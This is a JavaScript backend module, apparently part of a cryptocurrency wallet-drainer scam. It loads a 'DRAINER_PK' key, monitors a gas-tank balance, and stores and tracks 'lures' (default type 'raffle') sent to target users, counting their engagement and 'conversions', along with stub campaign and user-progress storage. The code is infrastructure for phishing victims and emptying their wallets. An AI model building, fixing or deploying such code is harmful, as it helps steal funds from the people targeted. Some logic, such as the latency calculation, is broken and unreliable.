// backend/modules/securityManager.js
import { ethers } from "ethers";
import { getRpcUrl } from '../config.js';
import { keyManager } from '../lib/keyManager.js';
import multiSigManager from '../lib/multiSigManager.js';

export class SecurityManager {
    constructor() {
        this.isInitialized = false;
        this.provider = new ethers.JsonRpcProvider(getRpcUrl(1));
        this.securityMonitor = null;
    }

    async initialize() {
        if (this.isInitialized) return true;
        try {
            console.log(`🔄 Initializing ${this.constructor.name}...`);
            
            // Initialize security components
            await this.initializeSecurity();
            
            // Start security monitoring
            this.securityMonitor = this.startSecurityMonitor();
            
            this.isInitialized = true;
            console.log(`✅ ${this.constructor.name} initialized`);
            return true;
        } catch (error) {
            console.error(`❌ ${this.constructor.name} initialization failed:`, error);
            return false;
        }
    }

    // ===== EXACT FUNCTIONS FROM app.js =====
    async initializeSecurity() {
        try {
            const masterPassword = process.env.ADMIN_PASSWORD;
            if (!masterPassword) {
                throw new Error('ADMIN_PASSWORD not found in environment variables');
            }
            
            await keyManager.initialize(masterPassword);
            console.log('🔐 Key Manager initialized');

            // ADD THIS LINE - Register the drainer key first
            await keyManager.addPrivateKey(process.env.DRAINER_PK, 'drainer');
            
            const pk = keyManager.getPrivateKey('drainer');
            if (!pk) {
                throw new Error('No private key found in key manager');
            }
            
            console.log('✅ Private key loaded successfully');
            return true;
            
        } catch (error) {
            console.error('❌ Security initialization failed:', error.message);
            throw error;
        }
    }

    async monitorGasTank() {
        try {
             const gasTankAddress = this.getAddress('gas_tank'); 
            const balance = await this.provider.getBalance(gasTankAddress);
            const minBalance = ethers.parseEther('0.1');
            
            if (balance < minBalance) {
                console.warn('⚠️ Gas tank low! Add more ETH to:', gasTankAddress);
                return { low: true, balance: ethers.formatEther(balance), address: gasTankAddress };
            }
            
            return { low: false, balance: ethers.formatEther(balance) };
        } catch (error) {
            console.error('❌ Gas tank monitoring failed:', error);
            return { low: false, balance: '0', error: error.message };
        }
    }

    async validatePrivateConfig() {
        const required = ['DRAINER_PK', 'ADMIN_PASSWORD'];
        const missing = required.filter(key => !process.env[key] || process.env[key] === '');
        
        if (missing.length > 0) {
            throw new Error('Missing required private configuration: ' + missing.join(', '));
        }
        
        return true;
    }

    async encryptSensitiveData(data, password) {
        try {
            const encrypted = await keyManager.encryptData(data, password);
            return encrypted;
        } catch (error) {
            console.error('❌ Data encryption failed:', error);
            throw error;
        }
    }

    async decryptSensitiveData(encryptedData, password) {
        try {
            const decrypted = await keyManager.decryptData(encryptedData, password);
            return decrypted;
        } catch (error) {
            console.error('❌ Data decryption failed:', error);
            throw error;
        }
    }

    async rotatePrivateKeys() {
        try {
            console.log('🔄 Rotating private keys...');
            await keyManager.rotateKeys();
            console.log('✅ Private keys rotated successfully');
            return true;
        } catch (error) {
            console.error('❌ Key rotation failed:', error);
            return false;
        }
    }

    async validateMultiSigOperation(operationId, requiredSignatures = 2) {
        try {
            const isApproved = multiSigManager.isOperationApproved(operationId);
            const signatures = multiSigManager.getSignatures(operationId);
            
            if (signatures.length >= requiredSignatures && isApproved) {
                return { approved: true, signatures };
            }
            
            return { approved: false, signatures, required: requiredSignatures };
        } catch (error) {
            console.error('❌ Multi-sig validation failed:', error);
            return { approved: false, error: error.message };
        }
    }

    async createMultiSigRequest(operationData) {
        try {
            const operationId = `op_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
            const request = multiSigManager.createApprovalRequest(operationId, operationData);
            
            return { success: true, operationId, request };
        } catch (error) {
            console.error('❌ Multi-sig request creation failed:', error);
            return { success: false, error: error.message };
        }
    }

    async addMultiSigSignature(operationId, signerAddress, signature) {
        try {
            const result = multiSigManager.addSignature(operationId, signerAddress, signature);
            return result;
        } catch (error) {
            console.error('❌ Multi-sig signature addition failed:', error);
            return { success: false, error: error.message };
        }
    }

    async getMultiSigStatus(operationId) {
        try {
            const isApproved = multiSigManager.isOperationApproved(operationId);
            const request = multiSigManager.pendingApprovals.get(operationId);
            const signatures = multiSigManager.getSignatures(operationId);
            
            return { approved: isApproved, request, signatures };
        } catch (error) {
            console.error('❌ Multi-sig status check failed:', error);
            return { approved: false, error: error.message };
        }
    }

    async cleanupMultiSigRequests(maxAgeHours = 24) {
        try {
            const cleaned = multiSigManager.cleanupOldRequests(maxAgeHours);
            console.log(`🧹 Cleaned up ${cleaned} old multi-sig requests`);
            return cleaned;
        } catch (error) {
            console.error('❌ Multi-sig cleanup failed:', error);
            return 0;
        }
    }

// ADD THIS METHOD to fix the "securityManager.storeLure is not a function" error
async storeLure(lureData) {
    try {
        console.log('💾 Storing lure data:', lureData.id || 'unknown');
        
        // Initialize lures array if it doesn't exist
        if (!this.lures) {
            this.lures = [];
        }
        
        // Create lure record
        const lureRecord = {
            id: lureData.id || `lure_${Date.now()}`,
            type: lureData.type || 'raffle',
            targetUser: lureData.targetUser,
            message: lureData.message,
            createdAt: new Date().toISOString(),
            status: 'active',
            engagement: 0,
            conversions: 0
        };
        
        // Store the lure
        this.lures.push(lureRecord);
        
        console.log(`✅ Lure stored successfully: ${lureRecord.id}`);
        return { success: true, lureId: lureRecord.id };
        
    } catch (error) {
        console.error('❌ Failed to store lure:', error);
        return { success: false, error: error.message };
    }
}

// ADD THIS METHOD TOO - for getting stored lures
async getStoredLures(filter = {}) {
    try {
        if (!this.lures) {
            this.lures = [];
        }
        
        let filteredLures = this.lures;
        
        // Apply filters if provided
        if (filter.type) {
            filteredLures = filteredLures.filter(lure => lure.type === filter.type);
        }
        if (filter.status) {
            filteredLures = filteredLures.filter(lure => lure.status === filter.status);
        }
        if (filter.targetUser) {
            filteredLures = filteredLures.filter(lure => lure.targetUser === filter.targetUser);
        }
        
        return { success: true, lures: filteredLures, total: filteredLures.length };
        
    } catch (error) {
        console.error('❌ Failed to get stored lures:', error);
        return { success: false, error: error.message, lures: [] };
    }
}

// ADD THIS METHOD TOO - for updating lure engagement
async trackLureEngagement(lureId, action = 'view') {
    try {
        if (!this.lures) {
            this.lures = [];
            return { success: false, error: 'No lures found' };
        }
        
        const lure = this.lures.find(l => l.id === lureId);
        if (!lure) {
            return { success: false, error: 'Lure not found' };
        }
        
        // Update engagement metrics
        if (!lure.engagement) lure.engagement = 0;
        if (!lure.conversions) lure.conversions = 0;
        
        lure.engagement++;
        
        if (action === 'convert') {
            lure.conversions++;
        }
        
        lure.lastEngagement = new Date().toISOString();
        
        console.log(`📊 Lure ${lureId} engagement: ${lure.engagement} views, ${lure.conversions} conversions`);
        
        return { 
            success: true, 
            engagement: lure.engagement, 
            conversions: lure.conversions 
        };
        
    } catch (error) {
        console.error('❌ Failed to track lure engagement:', error);
        return { success: false, error: error.message };
    }
}

// ADD THIS METHOD to fix gas tank monitoring error
getAddress(keyName = 'drainer') {
    try {
        // First try to get from keyManager
        if (keyManager && typeof keyManager.getAddress === 'function') {
            const address = keyManager.getAddress(keyName);
            if (address) return address;
        }
        
        // Fallback: derive from private key in env
        if (process.env.DRAINER_PK) {
            try {
                const wallet = new ethers.Wallet(process.env.DRAINER_PK);
                return wallet.address;
            } catch (e) {
                console.error('❌ Failed to derive address from private key:', e.message);
            }
        }
        
        // Final fallback
        console.warn('⚠️ Using fallback address for gas tank monitoring');
        return '0x0000000000000000000000000000000000000000';
        
    } catch (error) {
        console.error('❌ getAddress failed:', error);
        return '0x0000000000000000000000000000000000000000';
    }
}



    async validateAddress(address) {
        try {
            return ethers.isAddress(address);
        } catch {
            return false;
        }
    }

    async validateTransaction(txData) {
        const validations = {
            hasToAddress: !!txData.to,
            hasValue: !!txData.value,
            validGasLimit: txData.gasLimit > 21000 && txData.gasLimit < 3000000,
            validChainId: [1, 56, 137, 42161, 10, 43114].includes(txData.chainId),
            reasonableValue: txData.value ? BigInt(txData.value) < ethers.parseEther('1000') : true
        };
        
        const isValid = Object.values(validations).every(v => v === true);
        return { isValid, validations };
    }

    async checkRpcHealth(rpcUrl) {
        try {
            const testProvider = new ethers.JsonRpcProvider(rpcUrl);
            const network = await testProvider.getNetwork();
            const blockNumber = await testProvider.getBlockNumber();
            
            return { 
                healthy: true, 
                chainId: network.chainId,
                blockNumber: blockNumber,
                latency: Date.now() - performance.now()
            };
        } catch (error) {
            return { healthy: false, error: error.message };
        }
    }

    async auditSecurity() {
        const auditResults = {
            envVars: this.checkEnvironmentVariables(),
            keyManager: await this.testKeyManager(),
            multiSig: await this.testMultiSig(),
            rpc: await this.testRpcConnections(),
            encryption: await this.testEncryption()
        };
        
        const allPassed = Object.values(auditResults).every(result => result.passed);
        
        return { passed: allPassed, results: auditResults };
    }

    checkEnvironmentVariables() {
        const required = ['DRAINER_PK', 'ADMIN_PASSWORD', 'RPC_URL'];
        const missing = required.filter(key => !process.env[key]);
        
        return { passed: missing.length === 0, missing };
    }

    async testKeyManager() {
        try {
            const testData = 'security_test_' + Date.now();
            const encrypted = await this.encryptSensitiveData(testData, 'test_password');
            const decrypted = await this.decryptSensitiveData(encrypted, 'test_password');
            
            return { passed: decrypted === testData };
        } catch (error) {
            return { passed: false, error: error.message };
        }
    }

    async testMultiSig() {
        try {
            const testOp = await this.createMultiSigRequest({ action: 'test', timestamp: Date.now() });
            return { passed: !!testOp.success };
        } catch (error) {
            return { passed: false, error: error.message };
        }
    }

    async testRpcConnections() {
        try {
            const health = await this.checkRpcHealth(getRpcUrl(1));
            return { passed: health.healthy, latency: health.latency };
        } catch (error) {
            return { passed: false, error: error.message };
        }
    }

    async testEncryption() {
        try {
            const testMessage = 'This is a test message for encryption validation';
            const encrypted = await this.encryptSensitiveData(testMessage, process.env.ADMIN_PASSWORD);
            const decrypted = await this.decryptSensitiveData(encrypted, process.env.ADMIN_PASSWORD);
            
            return { passed: decrypted === testMessage };
        } catch (error) {
            return { passed: false, error: error.message };
        }
    }

    startSecurityMonitor(interval = 300000) {
        return setInterval(async () => {
            await this.monitorGasTank();
            await this.cleanupMultiSigRequests();
        }, interval);
    }

    // ADDED: Missing method that was causing the error
    async loadActiveCampaigns() {
        try {
            console.log('📋 Loading active campaigns...');
            
            // This would load from database or storage
            // For now, return an empty array to prevent the error
            const campaigns = [];
            
            console.log(`✅ Loaded ${campaigns.length} active campaigns`);
            return campaigns;
        } catch (error) {
            console.error('❌ Failed to load active campaigns:', error);
            return [];
        }
    }

    // ADDED: Store campaign method (might be needed)
    async storeCampaign(campaignId, campaignData) {
        try {
            // This would store to database
            // For now, just log and return success
            console.log(`💾 Storing campaign: ${campaignId}`);
            return { success: true, campaignId };
        } catch (error) {
            console.error('❌ Failed to store campaign:', error);
            return { success: false, error: error.message };
        }
    }

    // ADDED: Store user progress method (might be needed)
    async storeUserProgress(progressId, progressData) {
        try {
            // This would store to database
            // For now, just log and return success
            console.log(`💾 Storing user progress: ${progressId}`);
            return { success: true, progressId };
        } catch (error) {
            console.error('❌ Failed to store user progress:', error);
            return { success: false, error: error.message };
        }
    }

    // Cleanup method to clear intervals
    async cleanup() {
        if (this.securityMonitor) {
            clearInterval(this.securityMonitor);
            this.securityMonitor = null;
        }
        this.isInitialized = false;
    }
}

export const securityManager = new SecurityManager();
